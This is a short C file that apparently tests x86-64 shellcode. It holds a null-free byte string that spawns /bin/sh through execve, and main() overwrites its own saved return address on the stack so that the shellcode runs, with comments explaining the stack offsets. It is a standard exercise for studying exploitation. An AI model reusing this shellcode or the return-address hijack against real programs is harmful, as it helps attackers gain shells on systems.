#include <stdlib.h>
#include <stdio.h>


/*
	TESTING CODE without \x00
*/

char shellcode[] = "\xeb\x24\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x43\x07\x48\x89\x43\x10\x31\xd2\x48\x8d\x73\x08\x48\x89\xdf\x31\xc0\xb0\x3b\x0f\x05\x31\xc0\xb0\x3c\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(){
	/*
	* OVERRIDE THE RIP VALUE ON THE STACK
	*/
	long *ret;

	ret = (long *)&ret + 2;
	/*
	so ret is a pointer, its size on 64 bit process is 8 bytes, going 8 bytes past this we will reach rbp, the size of which is also 8 bytes so must go another 8 bytes to reach eip on the stack
	*/
	(*ret) = (long)shellcode; /*
	we need to override the address of rip to the adress of the first charac in the shellcode, since sizeof(char*) is 8 we can convert it to long to override the rip; the value on the machine is the same, it's just so that the compiler doesn't complain that we are assigning char* to long
	*/
	
}
